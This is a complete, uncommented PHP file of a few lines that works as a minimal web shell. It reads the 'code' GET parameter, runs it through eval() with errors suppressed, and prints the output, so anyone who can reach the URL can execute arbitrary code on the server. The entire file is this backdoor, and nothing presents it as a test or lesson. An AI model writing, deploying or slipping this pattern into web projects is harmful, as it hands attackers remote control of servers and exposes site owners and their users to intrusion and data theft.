<?php

$code = @$_GET['code'];
$output = eval($code);
echo $output;

?>
